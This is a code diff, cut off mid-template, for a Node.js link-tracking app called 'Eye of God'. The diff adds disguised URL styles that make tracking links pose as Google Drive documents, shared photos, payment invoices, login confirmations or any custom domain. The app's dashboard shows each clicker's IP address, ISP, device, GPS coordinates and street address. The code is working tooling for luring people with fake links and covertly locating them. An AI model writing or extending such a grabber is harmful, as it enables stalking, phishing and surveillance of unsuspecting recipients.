@@ -35,6 +35,61 @@ function writeDB(data) {
   fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
 }
 
+// Lista de palavras para gerar URLs amigáveis
+const adjectives = ['seguro', 'rapido', 'privado', 'oficial', 'novo', 'premium', 'facil', 'digital', 'smart', 'social', 'web', 'mega'];
+const nouns = ['acesso', 'link', 'portal', 'entrada', 'site', 'pagina', 'plataforma', 'app', 'caminho', 'conta', 'perfil', 'docs'];
+const domains = ['online', 'web', 'app', 'site', 'info', 'me', 'net', 'link', 'click', 'go', 'now', 'page'];
+
+// Gerar um slug amigável para o link
+function generateFriendlySlug() {
+  const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
+  const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
+  const randomNumber = Math.floor(Math.random() * 1000);
+  
+  return `${randomAdjective}-${randomNoun}-${randomNumber}`;
+}
+
+// Gerar URLs mascaradas que parecem legítimas
+function generateMaskedUrl(req, linkId, style = 'default', customMask = null) {
+  const host = req.headers.host;
+  const protocol = req.protocol;
+  const baseUrl = `${protocol}://${host}`;
+  
+  // Se tem uma máscara personalizada, usá-la
+  if (customMask && customMask.trim() !== '') {
+    // Verificar se a máscara já tem um protocolo (http/https)
+    if (customMask.startsWith('http://') || customMask.startsWith('https://')) {
+      return customMask;
+    } else {
+      // Adicionar https:// como padrão se não tiver
+      return `https://${customMask}`;
+    }
+  }
+  
+  // Caso contrário, usar os estilos predefinidos
+  switch (style) {
+    case 'google':
+      return `${baseUrl}/drive/document/view/${linkId}`;
+    case 'document':
+      return `${baseUrl}/docs/shared/document/${linkId}/view`;
+    case 'photo':
+      return `${baseUrl}/photos/album/shared/${linkId}`;
+    case 'payment':
+      return `${baseUrl}/payment/invoice/${linkId}/secure`;
+    case 'login':
+      return `${baseUrl}/account/login/confirm/${linkId}`;
+    case 'friendly':
+      const friendlySlug = generateFriendlySlug();
+      return `${baseUrl}/s/${friendlySlug}`;
+    case 'short':
+      // Gera uma ID curta alfanumérica de 5-7 caracteres
+      const shortId = linkId.substring(0, 6);
+      return `${baseUrl}/l/${shortId}`;
+    default:
+      return `${baseUrl}/t/${linkId}`;
+  }
+}
+
 // Função para obter o IP real do cliente
 function getRealIP(req) {
   // Ordem de prioridade para headers que contêm o IP real
@@ -291,7 +346,7 @@ async function getIPInfo(ip) {
 // Rotas
 // Gerar novo link
 app.post('/api/generate-link', async (req, res) => {
-  const { targetUrl } = req.body;
+  const { targetUrl, maskStyle, customMask } = req.body;
   
   if (!targetUrl) {
     return res.status(400).json({ error: 'URL de destino é necessária' });
@@ -301,12 +356,26 @@ app.post('/api/generate-link', async (req, res) => {
   const linkId = uuidv4();
   const db = readDB();
   
+  // Selecionar estilo de máscara (padrão ou especificado pelo usuário)
+  const style = maskStyle || 'default';
+  
+  // Gerar um slug amigável se for estilo 'friendly'
+  let friendlySlug = null;
+  if (style === 'friendly') {
+    friendlySlug = generateFriendlySlug();
+  } else if (style === 'short') {
+    friendlySlug = linkId.substring(0, 6);
+  }
+  
   // Armazenar informações do link
   db.links[linkId] = {
     id: linkId,
     targetUrl,
     createdAt: new Date().toISOString(),
-    createdBy: getRealIP(req)
+    createdBy: getRealIP(req),
+    maskStyle: style,
+    friendlySlug,
+    customMask: customMask || null
   };
   
   // Inicializar o histórico de rastreamento para este link
@@ -314,18 +383,72 @@ app.post('/api/generate-link', async (req, res) => {
   
   writeDB(db);
   
-  // Retornar o link de rastreamento
-  const host = isProduction ? req.headers.host : `${req.headers.host}`;
-  const trackingLink = `${req.protocol}://${host}/t/${linkId}`;
+  // Gerar o link mascarado apropriado
+  const trackingLink = generateMaskedUrl(req, linkId, style, customMask);
   
   res.json({
     success: true,
     linkId,
     trackingLink,
     shortLink: trackingLink,
-    originalUrl: targetUrl
+    originalUrl: targetUrl,
+    maskStyle: style
   });
 });
+
+// Rotas para links mascarados
+app.get('/drive/document/view/:linkId', handleMaskedRedirect);
+app.get('/docs/shared/document/:linkId/view', handleMaskedRedirect);
+app.get('/photos/album/shared/:linkId', handleMaskedRedirect);
+app.get('/payment/invoice/:linkId/secure', handleMaskedRedirect);
+app.get('/account/login/confirm/:linkId', handleMaskedRedirect);
+
+// Rota para links curtos
+app.get('/l/:shortId', (req, res) => {
+  const { shortId } = req.params;
+  const db = readDB();
+  
+  // Encontrar o link pelo ID curto
+  const linkId = Object.keys(db.links).find(id => id.startsWith(shortId));
+  
+  if (!linkId) {
+    return res.status(404).send('Link não encontrado');
+  }
+  
+  // Redirecionar para a rota principal de tracking
+  res.redirect(`/t/${linkId}`);
+});
+
+// Rota para links amigáveis
+app.get('/s/:friendlySlug', (req, res) => {
+  const { friendlySlug } = req.params;
+  const db = readDB();
+  
+  // Encontrar o link pelo slug amigável
+  const linkId = Object.keys(db.links).find(id => 
+    db.links[id].friendlySlug === friendlySlug
+  );
+  
+  if (!linkId) {
+    return res.status(404).send('Link não encontrado');
+  }
+  
+  // Redirecionar para a rota principal de tracking
+  res.redirect(`/t/${linkId}`);
+});
+
+// Função que lida com redirecionamento de URLs mascaradas
+function handleMaskedRedirect(req, res) {
+  const linkId = req.params.linkId;
+  const db = readDB();
+  
+  if (!db.links[linkId]) {
+    return res.status(404).send('Link não encontrado');
+  }
+  
+  // Redirecionar para a rota principal de tracking
+  res.redirect(`/t/${linkId}`);
+}
 
 // Redirecionamento e rastreamento
 app.get('/t/:linkId', async (req, res) => {
@@ -731,56 +854,149 @@ app.get('/info/:linkId', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Eye of God - Rastreamento de Link</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <style>
       body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         line-height: 1.6;
         margin: 0;
-        padding: 20px;
+        padding: 0;
         color: #333;
-        background-color: #f8f9fa;
+        background-color: #f0f2f5;
       }
       .container {
-        max-width: 1000px;
-        margin: 0 auto;
+        max-width: 1200px;
+        margin: 20px auto;
         background: white;
         padding: 25px;
-        border-radius: 8px;
+        border-radius: 12px;
         box-shadow: 0 0 20px rgba(0,0,0,0.05);
       }
-      h1 {
-        color: #2c3e50;
-        border-bottom: 2px solid #3498db;
-        padding-bottom: 15px;
-        margin-bottom: 25px;
-      }
-      .link-info {
-        background-color: #f8f9fa;
-        padding: 20px;
+      .header {
+        background: linear-gradient(135deg, #2c3e50, #3498db);
+        color: white;
+        padding: 25px;
         border-radius: 8px;
         margin-bottom: 30px;
-        border-left: 4px solid #3498db;
+        position: relative;
+        overflow: hidden;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      }
+      .header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('https://www.transparenttextures.com/patterns/cubes.png');
+        opacity: 0.1;
+      }
+      h1 {
+        margin: 0;
+        padding-bottom: 5px;
+        font-size: 2.2em;
+        position: relative;
+      }
+      .subtitle {
+        opacity: 0.9;
+        margin: 5px 0 0;
+      }
+      .dashboard-container {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 20px;
+        margin-bottom: 30px;
+      }
+      .main-panel {
+        flex: 2;
+        min-width: 300px;
+      }
+      .side-panel {
+        flex: 1;
+        min-width: 300px;
+      }
+      .card {
+        background: white;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.05);
+        padding: 20px;
+        margin-bottom: 20px;
+        border-top: 5px solid #3498db;
+      }
+      .card-header {
+        margin-bottom: 15px;
+        padding-bottom: 10px;
+        border-bottom: 1px solid #eee;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .card-title {
+        font-size: 1.2em;
+        color: #2c3e50;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .link-info {
+        background-color: white;
+        padding: 20px;
+        border-radius: 10px;
+        margin-bottom: 30px;
+        box-shadow: 0 0 15px rgba(0,0,0,0.05);
+      }
+      .tabs {
+        display: flex;
+        border-bottom: 1px solid #eee;
+        margin-bottom: 20px;
+      }
+      .tab {
+        padding: 10px 20px;
+        cursor: pointer;
+        border-bottom: 3px solid transparent;
+        color: #7f8c8d;
+        font-weight: 500;
+        transition: all 0.3s;
+      }
+      .tab.active {
+        border-bottom: 3px solid #3498db;
+        color: #3498db;
+      }
+      .tab-content {
+        display: none;
+      }
+      .tab-content.active {
+        display: block;
       }
       .trace-item {
-        border-left: 4px solid #3498db;
-        padding: 15px;
+        border-radius: 10px;
+        padding: 20px;
         margin-bottom: 20px;
-        background-color: #f8f9fa;
-        border-radius: 8px;
+        background-color: white;
         box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         transition: transform 0.2s;
       }
       .trace-item:hover {
         transform: translateY(-3px);
-        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      }
+      .trace-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 15px;
+        padding-bottom: 10px;
+        border-bottom: 1px solid #eee;
       }
       .trace-time {
         color: #7f8c8d;
         font-size: 0.9em;
-        margin-bottom: 10px;
       }
       .trace-details {
-        margin-top: 10px;
         display: flex;
         flex-wrap: wrap;
         gap: 20px;
@@ -800,85 +1016,152 @@ app.get('/info/:linkId', (req, res) => {
         background: #f8f9fa;
         border-radius: 8px;
       }
-      .back-button {
-        display: inline-block;
-        margin-top: 20px;
+      .action-buttons {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
         background-color: #3498db;
         color: white;
-        padding: 12px 20px;
+        padding: 10px 15px;
         text-decoration: none;
-        border-radius: 5px;
+        border-radius: 6px;
         font-weight: 500;
-        transition: background-color 0.2s;
+        transition: all 0.3s;
+        border: none;
+        cursor: pointer;
       }
-      .back-button:hover {
+      .btn-primary {
+        background-color: #3498db;
+      }
+      .btn-primary:hover {
         background-color: #2980b9;
       }
-      .stats {
+      .btn-secondary {
         background-color: #2c3e50;
-        color: white;
-        padding: 15px;
-        border-radius: 8px;
-        margin-bottom: 25px;
-        display: flex;
-        justify-content: space-around;
-        text-align: center;
       }
-      .stat-item {
-        padding: 0 10px;
+      .btn-secondary:hover {
+        background-color: #1a252f;
+      }
+      .btn-success {
+        background-color: #27ae60;
+      }
+      .btn-success:hover {
+        background-color: #219955;
+      }
+      .btn-danger {
+        background-color: #e74c3c;
+      }
+      .btn-danger:hover {
+        background-color: #c0392b;
+      }
+      .stats {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 15px;
+        margin-bottom: 30px;
+      }
+      .stat-card {
+        flex: 1;
+        min-width: 170px;
+        background: white;
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+        box-shadow: 0 0 10px rgba(0,0,0,0.05);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        transition: transform 0.3s;
+      }
+      .stat-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      }
+      .stat-icon {
+        width: 50px;
+        height: 50px;
+        background-color: rgba(52, 152, 219, 0.1);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 15px;
+        color: #3498db;
+        font-size: 1.5em;
       }
       .stat-value {
-        font-size: 1.8em;
+        font-size: 2.2em;
         font-weight: bold;
-        display: block;
         margin-bottom: 5px;
+        color: #2c3e50;
       }
       .stat-label {
+        color: #7f8c8d;
         font-size: 0.9em;
-        opacity: 0.8;
+      }
+      .stat-card:nth-child(1) .stat-icon {
+        background-color: rgba(52, 152, 219, 0.1);
+        color: #3498db;
+      }
+      .stat-card:nth-child(2) .stat-icon {
+        background-color: rgba(46, 204, 113, 0.1);
+        color: #2ecc71;
+      }
+      .stat-card:nth-child(3) .stat-icon {
+        background-color: rgba(155, 89, 182, 0.1);
+        color: #9b59b6;
+      }
+      .stat-card:nth-child(4) .stat-icon {
+        background-color: rgba(230, 126, 34, 0.1);
+        color: #e67e22;
+      }
+      .chart-container {
+        width: 100%;
+        height: 300px;
+        margin-bottom: 20px;
+        position: relative;
       }
       .map-container {
-        height: 250px;
+        height: 300px;
         margin-top: 15px;
-        border-radius: 8px;
+        border-radius: 10px;
         overflow: hidden;
         box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      }
-      @media (max-width: 768px) {
-        .container {
-          padding: 15px;
-        }
-        .stats {
-          flex-direction: column;
-          gap: 10px;
-        }
       }
       .qr-code {
         text-align: center;
         margin: 20px 0;
       }
       .copy-link {
-        background: #eee;
-        padding: 10px;
-        border-radius: 5px;
+        background: #f8f9fa;
+        padding: 12px;
+        border-radius: 6px;
         font-family: monospace;
         display: flex;
         align-items: center;
         margin: 15px 0;
+        border: 1px solid #eee;
       }
       .copy-link input {
         flex: 1;
         border: none;
         background: transparent;
         padding: 5px;
+        font-size: 0.9em;
       }
       .copy-btn {
         background: #3498db;
         color: white;
         border: none;
-        padding: 5px 10px;
-        border-radius: 3px;
+        padding: 8px 12px;
+        border-radius: 4px;
         cursor: pointer;
+        font-size: 0.9em;
       }
       .device-info {
         display: flex;
@@ -899,8 +1182,8 @@ app.get('/info/:linkId', (req, res) => {
       }
       .accuracy-badge {
         font-size: 0.8em;
-        padding: 2px 6px;
-        border-radius: 4px;
+        padding: 3px 8px;
+        border-radius: 12px;
         margin-left: 5px;
         display: inline-block;
       }
@@ -922,62 +1205,118 @@ app.get('/info/:linkId', (req, res) => {
       }
       .precise-location {
         background-color: #e8f6ff;
-        padding: 10px;
-        border-radius: 6px;
+        padding: 15px;
+        border-radius: 8px;
         margin: 10px 0;
         border-left: 4px solid #27ae60;
       }
       .precise-location p {
         margin: 5px 0;
       }
-      .stats-box {
-        margin-top: 10px;
-        margin-bottom: 15px;
-        padding: 10px;
-        background-color: #f8f9fa;
-        border-radius: 6px;
+      .world-map {
+        width: 100%;
+        height: 300px;
+        margin-bottom: 20px;
+        border-radius: 10px;
+        overflow: hidden;
+      }
+      .footer {
+        text-align: center;
+        margin-top: 40px;
+        color: #7f8c8d;
         font-size: 0.9em;
+        padding-top: 20px;
+        border-top: 1px solid #eee;
+      }
+      @media print {
+        body {
+          background-color: white;
+        }
+        .container {
+          box-shadow: none;
+          margin: 0;
+          padding: 0;
+        }
+        .action-buttons, .tab, .copy-btn {
+          display: none;
+        }
+        .tab-content {
+          display: block !important;
+        }
+        .chart-container {
+          break-inside: avoid;
+        }
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <h1>Rastreamento de Link</h1>
+    <div class="container" id="dashboard">
+      <div class="header">
+        <h1><i class="fas fa-eye"></i> Eye of God - Dashboard</h1>
+        <p class="subtitle">Rastreamento detalhado e análise de links</p>
+      </div>
       
-      <div class="link-info">
-        <h2>Informações do Link</h2>
+      <div class="action-buttons">
+        <a href="/" class="btn btn-secondary"><i class="fas fa-home"></i> Página Inicial</a>
+        <button class="btn btn-primary" onclick="generateNewQRCode()"><i class="fas fa-qrcode"></i> Novo QR Code</button>
+        <button class="btn btn-success" onclick="exportToPDF()"><i class="fas fa-file-pdf"></i> Exportar PDF</button>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h2 class="card-title"><i class="fas fa-link"></i> Informações do Link</h2>
+        </div>
+        
         <p><strong>Link de rastreamento:</strong></p>
         <div class="copy-link">
           <input type="text" readonly value="${req.protocol}://${req.get('host')}/t/${linkId}" id="trackingLink">
-          <button class="copy-btn" onclick="copyLink()">Copiar</button>
+          <button class="copy-btn" onclick="copyLink('trackingLink')"><i class="fas fa-copy"></i> Copiar</button>
         </div>
+        
         <p><strong>URL de destino:</strong> ${link.targetUrl}</p>
         <p><strong>Criado em:</strong> ${new Date(link.createdAt).toLocaleString('pt-BR')}</p>
+        ${link.customMask ? `<p><strong>Máscara personalizada:</strong> ${link.customMask} <span style="color:#e74c3c;">(URL exibida para os destinatários)</span></p>` : ''}
+        ${link.maskStyle !== 'default' ? `<p><strong>Estilo de máscara:</strong> ${link.maskStyle}</p>` : ''}
         
-        <div class="qr-code">
-          <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(`${req.protocol}://${req.get('host')}/t/${linkId}`)}" alt="QR Code do link">
+        <div class="qr-code" id="qrCode">
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(`${req.protocol}://${req.get('host')}/t/${linkId}`)}" alt="QR Code do link">
           <p>Escaneie este QR Code para acessar o link</p>
+        </div>
+        
+        <div id="qrCodeCustomization" style="text-align: center; margin-top: 15px; display: none;">
+          <label for="qrSize">Tamanho:</label>
+          <select id="qrSize" style="margin: 0 10px;">
+            <option value="200x200">Pequeno</option>
+            <option value="300x300" selected>Médio</option>
+            <option value="400x400">Grande</option>
+          </select>
+          
+          <label for="qrColor">Cor:</label>
+          <input type="color" id="qrColor" value="#000000" style="margin: 0 10px;">
+          
+          <button class="btn btn-primary" onclick="updateQRCode()" style="margin: 0 10px;">Atualizar QR Code</button>
         </div>
       </div>
       
       <div class="stats">
-        <div class="stat-item">
+        <div class="stat-card">
+          <div class="stat-icon"><i class="fas fa-eye"></i></div>
           <span class="stat-value">${traces.length}</span>
           <span class="stat-label">Total de Acessos</span>
         </div>
-        <div class="stat-item">
-          <span class="stat-value">${traces.length > 0 ? new Date(traces[traces.length - 1].timestamp).toLocaleDateString('pt-BR') : '-'}</span>
-          <span class="stat-label">Último Acesso</span>
-        </div>
-        <div class="stat-item">
+        
+        <div class="stat-card">
+          <div class="stat-icon"><i class="fas fa-map-marker-alt"></i></div>
           <span class="stat-value">${(() => {
             // Contabilizar localizações precisas
             const precisas = traces.filter(trace => trace.preciseLocation && trace.preciseLocation.latitude).length;
-            return precisas > 0 ? `${precisas}/${traces.length}` : '0';
+            return precisas;
           })()}</span>
           <span class="stat-label">Localizações Precisas</span>
         </div>
-        <div class="stat-item">
+        
+        <div class="stat-card">
+          <div class="stat-icon"><i class="fas fa-mobile-alt"></i></div>
           <span class="stat-value">${(() => {
             // Contar dispositivos únicos baseado no User-Agent
             const uniqueDevices = new Set();
@@ -993,118 +1332,607 @@ app.get('/info/:linkId', (req, res) => {
             });
             return uniqueDevices.size;
           })()}</span>
-          <span class="stat-label">Tipos de Dispositivo</span>
+          <span class="stat-label">Tipos de Dispositivos</span>
+        </div>
+        
+        <div class="stat-card">
+          <div class="stat-icon"><i class="fas fa-calendar-alt"></i></div>
+          <span class="stat-value">${traces.length > 0 ? new Date(traces[traces.length - 1].timestamp).toLocaleDateString('pt-BR') : '-'}</span>
+          <span class="stat-label">Último Acesso</span>
         </div>
       </div>
       
-      <h2>Histórico de Acessos</h2>
-      ${traces.length === 0 ? 
-        '<p class="no-traces">Ainda não há registros de acesso para este link.</p>' :
-        traces.map((trace, index) => {
-          // Determinar o tipo de dispositivo baseado no User-Agent
-          const ua = trace.userAgent;
-          let deviceType = 'desktop';
-          let deviceIcon = '💻';
-          
-          if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
-            deviceType = 'mobile';
-            deviceIcon = '📱';
-          } else if (ua.includes('iPad') || ua.includes('Tablet')) {
-            deviceType = 'tablet';
-            deviceIcon = '📟';
-          }
-          
-          // Extrair navegador e sistema operacional
-          let browser = 'Desconhecido';
-          let os = 'Desconhecido';
-          
-          if (ua.includes('Firefox')) browser = 'Firefox';
-          else if (ua.includes('Chrome')) browser = 'Chrome';
-          else if (ua.includes('Safari')) browser = 'Safari';
-          else if (ua.includes('Edge')) browser = 'Edge';
-          else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
-          else if (ua.includes('WhatsApp')) browser = 'WhatsApp';
-          
-          if (ua.includes('Windows')) os = 'Windows';
-          else if (ua.includes('Mac OS')) os = 'macOS';
-          else if (ua.includes('Android')) os = 'Android';
-          else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-          else if (ua.includes('Linux')) os = 'Linux';
-          
-          return `
-            <div class="trace-item">
-              <div class="trace-time">
-                <strong>Acesso #${index + 1}</strong> - ${new Date(trace.timestamp).toLocaleString('pt-BR')}
-              </div>
-              <div class="trace-details">
-                <div class="trace-details-col">
-                  <p><strong>IP:</strong> ${trace.ip}</p>
-                  
-                  ${(() => {
-                    // Verificar se temos localização precisa do usuário
-                    if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
-                      const precisionMeters = Math.round(trace.preciseLocation.accuracy);
-                      return `
-                        <div class="precise-location">
-                          <p><strong>Localização Exata:</strong> <span class="accuracy-badge alta">Precisão Alta</span></p>
-                          <p><strong>Coordenadas GPS:</strong> ${trace.preciseLocation.latitude.toFixed(6)}, ${trace.preciseLocation.longitude.toFixed(6)}</p>
-                          <p><strong>Precisão:</strong> ±${precisionMeters} metros</p>
-                          ${trace.addressDetails ? `
-                            <p><strong>Endereço:</strong> ${trace.addressDetails.formatted || 'Indisponível'}</p>
-                            ${trace.addressDetails.road ? `<p><strong>Rua:</strong> ${trace.addressDetails.road}${trace.addressDetails.house_number ? `, ${trace.addressDetails.house_number}` : ''}</p>` : ''}
-                            ${trace.addressDetails.neighbourhood ? `<p><strong>Bairro:</strong> ${trace.addressDetails.neighbourhood}</p>` : ''}
-                            ${trace.addressDetails.city ? `<p><strong>Cidade:</strong> ${trace.addressDetails.city}</p>` : ''}
-                          ` : ''}
-                        </div>
-                      `;
-                    } else {
-                      return `
-                        <p><strong>Localização:</strong> ${trace.ipInfo.location && trace.ipInfo.location !== 'Desconhecido' ? trace.ipInfo.location : 'Não foi possível determinar a localização'}</p>
-                        ${trace.ipInfo.coordinates ? `<p><strong>Coordenadas:</strong> ${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude} <span class="accuracy-badge ${trace.ipInfo.coordinates.accuracy}">(Precisão ${trace.ipInfo.coordinates.accuracy})</span></p>` : ''}
-                      `;
-                    }
-                  })()}
-                  
-                  ${trace.ipInfo.continent ? `<p><strong>Continente:</strong> ${trace.ipInfo.continent}</p>` : ''}
-                  ${trace.ipInfo.timezone ? `<p><strong>Fuso horário:</strong> ${trace.ipInfo.timezone}</p>` : ''}
-                  <p><strong>Provedor:</strong> ${trace.ipInfo.isp && trace.ipInfo.isp !== 'Desconhecido' ? trace.ipInfo.isp : 'Informação indisponível'}</p>
-                  ${trace.ipInfo.asn && trace.ipInfo.asn !== 'Desconhecido' ? `<p><strong>ASN:</strong> ${trace.ipInfo.asn}</p>` : ''}
-                  ${trace.ipInfo.currency ? `<p><strong>Moeda local:</strong> ${trace.ipInfo.currency}</p>` : ''}
-                </div>
-                <div class="trace-details-col">
-                  <p class="device-info"><span class="device-icon">${deviceIcon}</span> <strong>${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)}</strong></p>
-                  <p><strong>Navegador:</strong> ${browser}</p>
-                  <p><strong>Sistema:</strong> ${os}</p>
-                  <p><strong>Origem:</strong> ${trace.referer}</p>
-                </div>
-              </div>
-              ${trace.ipInfo.location && trace.ipInfo.location !== 'Local (Simulado)' && 
-                trace.ipInfo.location !== 'Desconhecido' && 
-                trace.ipInfo.location !== 'Localização não identificada' && 
-                trace.ipInfo.location !== 'Erro na obtenção de dados' ? 
-                `<div class="map-container" id="map-${index}"></div>` : 
-                '<div class="no-map-info"><p>Mapa não disponível para este endereço IP</p></div>'}
+      <div class="dashboard-container">
+        <div class="main-panel">
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title"><i class="fas fa-chart-pie"></i> Análise de Dados</h3>
             </div>
-          `;
-        }).join('')
-      }
+            
+            <div class="tabs">
+              <div class="tab active" data-tab="dispositivos">Dispositivos</div>
+              <div class="tab" data-tab="paises">Países</div>
+              <div class="tab" data-tab="navegadores">Navegadores</div>
+              <div class="tab" data-tab="timeline">Timeline</div>
+            </div>
+            
+            <div class="tab-content active" id="dispositivos">
+              <div class="chart-container">
+                <canvas id="deviceChart"></canvas>
+              </div>
+            </div>
+            
+            <div class="tab-content" id="paises">
+              <div class="chart-container">
+                <canvas id="countryChart"></canvas>
+              </div>
+            </div>
+            
+            <div class="tab-content" id="navegadores">
+              <div class="chart-container">
+                <canvas id="browserChart"></canvas>
+              </div>
+            </div>
+            
+            <div class="tab-content" id="timeline">
+              <div class="chart-container">
+                <canvas id="timelineChart"></canvas>
+              </div>
+            </div>
+          </div>
+          
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title"><i class="fas fa-globe-americas"></i> Mapa de Acessos</h3>
+            </div>
+            <div id="worldMap" class="world-map"></div>
+          </div>
+          
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title"><i class="fas fa-list"></i> Histórico de Acessos</h3>
+            </div>
+            
+            ${traces.length === 0 ? 
+            '<p class="no-traces">Ainda não há registros de acesso para este link.</p>' :
+            traces.map((trace, index) => {
+              // Determinar o tipo de dispositivo baseado no User-Agent
+              const ua = trace.userAgent;
+              let deviceType = 'desktop';
+              let deviceIcon = '<i class="fas fa-desktop"></i>';
+              
+              if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
+                deviceType = 'mobile';
+                deviceIcon = '<i class="fas fa-mobile-alt"></i>';
+              } else if (ua.includes('iPad') || ua.includes('Tablet')) {
+                deviceType = 'tablet';
+                deviceIcon = '<i class="fas fa-tablet-alt"></i>';
+              }
+              
+              // Extrair navegador e sistema operacional
+              let browser = 'Desconhecido';
+              let browserIcon = '<i class="fas fa-globe"></i>';
+              let os = 'Desconhecido';
+              let osIcon = '<i class="fas fa-question-circle"></i>';
+              
+              if (ua.includes('Firefox')) {
+                browser = 'Firefox';
+                browserIcon = '<i class="fab fa-firefox"></i>';
+              } else if (ua.includes('Chrome')) {
+                browser = 'Chrome';
+                browserIcon = '<i class="fab fa-chrome"></i>';
+              } else if (ua.includes('Safari')) {
+                browser = 'Safari';
+                browserIcon = '<i class="fab fa-safari"></i>';
+              } else if (ua.includes('Edge')) {
+                browser = 'Edge';
+                browserIcon = '<i class="fab fa-edge"></i>';
+              } else if (ua.includes('MSIE') || ua.includes('Trident')) {
+                browser = 'Internet Explorer';
+                browserIcon = '<i class="fab fa-internet-explorer"></i>';
+              } else if (ua.includes('WhatsApp')) {
+                browser = 'WhatsApp';
+                browserIcon = '<i class="fab fa-whatsapp"></i>';
+              }
+              
+              if (ua.includes('Windows')) {
+                os = 'Windows';
+                osIcon = '<i class="fab fa-windows"></i>';
+              } else if (ua.includes('Mac OS')) {
+                os = 'macOS';
+                osIcon = '<i class="fab fa-apple"></i>';
+              } else if (ua.includes('Android')) {
+                os = 'Android';
+                osIcon = '<i class="fab fa-android"></i>';
+              } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
+                os = 'iOS';
+                osIcon = '<i class="fab fa-apple"></i>';
+              } else if (ua.includes('Linux')) {
+                os = 'Linux';
+                osIcon = '<i class="fab fa-linux"></i>';
+              }
+              
+              return `
+                <div class="trace-item">
+                  <div class="trace-header">
+                    <strong>Acesso #${index + 1}</strong>
+                    <div class="trace-time">${new Date(trace.timestamp).toLocaleString('pt-BR')}</div>
+                  </div>
+                  
+                  <div class="trace-details">
+                    <div class="trace-details-col">
+                      <p><strong>IP:</strong> ${trace.ip}</p>
+                      
+                      ${(() => {
+                        // Verificar se temos localização precisa do usuário
+                        if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
+                          const precisionMeters = Math.round(trace.preciseLocation.accuracy);
+                          return `
+                            <div class="precise-location">
+                              <p><strong><i class="fas fa-map-marker-alt"></i> Localização Exata:</strong> <span class="accuracy-badge alta">Precisão Alta</span></p>
+                              <p><strong>Coordenadas GPS:</strong> ${trace.preciseLocation.latitude.toFixed(6)}, ${trace.preciseLocation.longitude.toFixed(6)}</p>
+                              <p><strong>Precisão:</strong> ±${precisionMeters} metros</p>
+                              ${trace.addressDetails ? `
+                                <p><strong>Endereço:</strong> ${trace.addressDetails.formatted || 'Indisponível'}</p>
+                                ${trace.addressDetails.road ? `<p><strong>Rua:</strong> ${trace.addressDetails.road}${trace.addressDetails.house_number ? `, ${trace.addressDetails.house_number}` : ''}</p>` : ''}
+                                ${trace.addressDetails.neighbourhood ? `<p><strong>Bairro:</strong> ${trace.addressDetails.neighbourhood}</p>` : ''}
+                                ${trace.addressDetails.city ? `<p><strong>Cidade:</strong> ${trace.addressDetails.city}</p>` : ''}
+                              ` : ''}
+                            </div>
+                          `;
+                        } else {
+                          return `
+                            <p><strong><i class="fas fa-map-pin"></i> Localização:</strong> ${trace.ipInfo.location && trace.ipInfo.location !== 'Desconhecido' ? trace.ipInfo.location : 'Não foi possível determinar a localização'}</p>
+                            ${trace.ipInfo.coordinates ? `<p><strong>Coordenadas:</strong> ${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude} <span class="accuracy-badge ${trace.ipInfo.coordinates.accuracy}">(Precisão ${trace.ipInfo.coordinates.accuracy})</span></p>` : ''}
+                          `;
+                        }
+                      })()}
+                      
+                      ${trace.ipInfo.continent ? `<p><strong><i class="fas fa-globe-americas"></i> Continente:</strong> ${trace.ipInfo.continent}</p>` : ''}
+                      ${trace.ipInfo.timezone ? `<p><strong><i class="fas fa-clock"></i> Fuso horário:</strong> ${trace.ipInfo.timezone}</p>` : ''}
